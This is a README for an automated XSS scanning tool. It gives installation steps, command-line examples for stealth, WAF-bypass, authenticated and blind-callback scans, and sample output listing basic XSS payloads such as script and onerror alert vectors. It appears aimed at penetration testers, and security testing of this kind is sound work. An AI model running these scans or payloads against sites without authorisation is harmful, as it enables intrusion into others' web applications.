# 🎯 AutoXSS v5.0 — Automated XSS Discovery Framework
> by **R0b3rt0** | 🛡️ Educational offensive security tooling

![Python](https://img.shields.io/badge/python-3.10%2B-blue?style=flat-square)
![License](https://img.shields.io/badge/license-MIT-green?style=flat-square)
![Status](https://img.shields.io/badge/status-active-brightgreen?style=flat-square)

🚀 A professional, automated XSS (Cross-Site Scripting) discovery framework that crawls websites, discovers endpoints, and tests them with 500+ XSS payloads across multiple contexts. Built for penetration testers and security researchers.

---

## ✨ Features

| Feature | Details |
|---------|---------|
| 🕷️ **Web Crawling** | Automatically discovers URLs and forms (depth configurable) |
| 🎯 **Context Detection** | Identifies HTML, attribute, script, and URL contexts automatically |
| 💉 **Payload Generation** | 500+ payloads across 12+ categories |
| 🛡️ **WAF Detection** | Identifies Cloudflare, ModSecurity, AWS WAF, Imperva, etc. |
| 🌐 **DOM Analysis** | Finds JavaScript sink/source chains for DOM XSS |
| 📡 **Header Testing** | Tests X-Forwarded-For, Referer, X-Real-IP, etc. |
| ⚡ **Multi-threaded** | Fast concurrent testing with configurable threads |
| 📊 **Report Export** | JSON & HTML reports with detailed findings |
| 🕶️ **Stealth Mode** | Slow requests, delay injection, evasion techniques |
| 🔐 **Encodings** | URL, Base64, Hex, Double-URL, Unicode |
| 🎲 **Random Sampling** | Pick N random payloads per run |
| ⚡ **Auto-install** | Automatically installs missing dependencies |

---

## 📦 Installation

```bash
# 1. Clone the repository
git clone https://github.com/Robertmwatua/xss-generator.git
cd xss-generator

# 2. Create a virtual environment (recommended to avoid system package warnings)
python3 -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate

# 3. Install dependencies
pip install -r requirements.txt

# Or install directly:
pip install requests beautifulsoup4 colorama urllib3

# 4. Verify installation
python -c "import requests, bs4, colorama; print('✅ Ready to go!')"

# 5. Run interactive wizard
python xssgen.py

# Or run a quick test
python xssgen.py https://httpbin.org/anything --mode quick --profile quick





# Just run with no arguments
python xssgen.py

# Follow the prompts:
# 1. Enter target URL
# 2. Choose scan mode (quick/standard/deep/stealth/targeted)
# 3. Select payload profile
# 4. Optional: Add cookies, headers, proxy
# 5. Confirm and launch





# Basic scan
python xssgen.py https://testsite.com

# Quick scan (fastest)
python xssgen.py https://testsite.com --mode quick --profile quick

# Deep scan with all payloads
python xssgen.py https://testsite.com --mode deep --profile all --depth 3

# WAF bypass mode
python xssgen.py https://testsite.com --mode stealth --profile waf_bypass --delay 1

# Targeted single parameter
python xssgen.py https://testsite.com/search --mode targeted --param q --profile all

# With authentication
python xssgen.py https://testsite.com --cookies "session=abc123; token=xyz"

# Through Burp Suite proxy
python xssgen.py https://testsite.com --proxy http://127.0.0.1:8080

# Verbose output for debugging
python xssgen.py https://testsite.com --verbose




Required:
  url                     Target URL (e.g., https://testsite.com)

Optional:
  --endpoint URL          Specific endpoint to test
  --param NAME            Known parameter to fuzz
  --mode MODE             quick/standard/deep/stealth/targeted
  --profile PROFILE       all/waf_bypass/polyglot/dom/blind/quick
  --depth N               Crawl depth (1-5, default: 2)
  --threads N             Concurrent threads (1-20, default: 5)
  --delay SECONDS         Delay between requests (default: 0)
  --timeout SECONDS       Request timeout (default: 10)
  --cookies STRING        Cookie string (e.g., "session=abc; token=xyz")
  --headers STRING        Custom headers (one per line)
  --proxy URL             Proxy URL (e.g., http://127.0.0.1:8080)
  --blind-callback URL    Callback for blind XSS testing
  --skip-headers          Don't test HTTP headers
  --no-dom                Skip DOM analysis
  --no-json               Don't save JSON report
  --no-html               Don't save HTML report
  --verbose               Show detailed output





  xss-generator/
├── 🐍 xssgen.py              # Main tool (2000+ lines)
├── 📦 requirements.txt       # Dependencies
├── 📖 README.md              # Documentation
├── ⚖️ LICENSE                # MIT License
└── 📂 payloads/              # Payload database
    ├── 📄 html.txt           # HTML body injection
    ├── 📄 attribute.txt      # HTML attribute breakout
    ├── 📄 js.txt             # JavaScript context breakout
    ├── 📄 url.txt            # URL / href context
    ├── 📄 dom.txt            # DOM-based vectors
    ├── 📄 advanced.txt       # Complex injection vectors
    ├── 📄 evasion.txt        # Filter evasion techniques
    └── 📄 waf-bypass.txt     # WAF bypass payloads





    ╔═══════════════════════════════════════════════════════════════════╗
║  XSS GEN v5.0 - Advanced XSS Payload Generator                    ║
║  Author: R0b3rt0 (Robert Mwatuwa)                                 ║
║  Session: a3f2b1c4                                                ║
║  Mode: Stealth | Anonymous Ready                                  ║
╚═══════════════════════════════════════════════════════════════════╝

[+] Loaded 47 payloads from html context

============================================================
 GENERATED PAYLOADS - HTML CONTEXT
============================================================

[ 1] <script>prompt(42)</script>
[ 2] <img src=x onerror=confirm(777)>
[ 3] <svg/onload=alert(1)>
[ 4] <ScRiPt>alert(1)</ScRiPt>
[ 5] <body onload=alert(1)>

============================================================
 SUMMARY
============================================================
Total Generated: 5
Context: html
Encoding: none
Randomized: Yes
============================================================

⚡ VULN ▶ Reflected XSS  |  GET param [search]  |  <script>alert(1)</script>




# JSON report (machine-readable, for automation)
xss_report_20260412_143022.json

# HTML report (human-readable, open in browser)
xss_report_20260412_143022.html



python xssgen.py https://target.com \
  --mode standard \
  --profile all \
  --depth 2 \
  --threads 5 \
  --verbose



  python xssgen.py https://protected.com \
  --mode stealth \
  --profile waf_bypass \
  --delay 2 \
  --threads 1 \
  --proxy http://127.0.0.1:8080


  python xssgen.py https://app.com/dashboard \
  --cookies "session=s3cr3t; csrf=token123" \
  --headers "Authorization: Bearer eyJhbG..." \
  --mode deep \
  --profile all


  # First, start a listener (e.g., interactsh, ngrok, or Burp Collaborator)
# Then run the scanner
python xssgen.py https://stored-xss.com \
  --profile blind \
  --blind-callback https://your-callback-server.com \
  --mode standard